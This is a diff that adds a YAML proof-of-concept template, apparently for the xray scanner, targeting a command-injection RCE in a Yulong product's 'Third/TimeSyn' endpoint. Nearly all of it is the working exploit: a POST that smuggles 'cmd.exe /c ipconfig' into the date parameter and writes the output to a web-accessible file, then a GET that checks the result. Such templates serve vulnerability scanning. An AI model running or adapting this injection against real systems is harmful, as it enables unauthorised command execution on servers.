@@ -1,0 +1,30 @@
+name: poc-yaml-yulong-Third_TimeSyn-RCE
+transport: http
+
+
+set:
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?r=Third/TimeSyn
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: application/x-www-form-urlencoded
+      body: cloudKey=0x0&date=|cmd.exe+/c+ipconfig+>+{{username}}.txt&time=1
+    expression: response.status == 200 && response.body.bcontains(b'1')
+  r1:
+    request:
+      method: GET
+      path: /{{username}}.txt
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    expression: response.status == 200 && response.body.bcontains(b'Windows') && response.body.bcontains(b'IP')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487664&idx=1&sn=229b4b4ae0c9d9dd9d64dce3f32fcd52&chksm=c267a583f5102c953f3c59e619a0196eda9df9cce115f5209e3e7026b50d2954fa23b604b788&token=1439003696&lang=zh_CN#rd
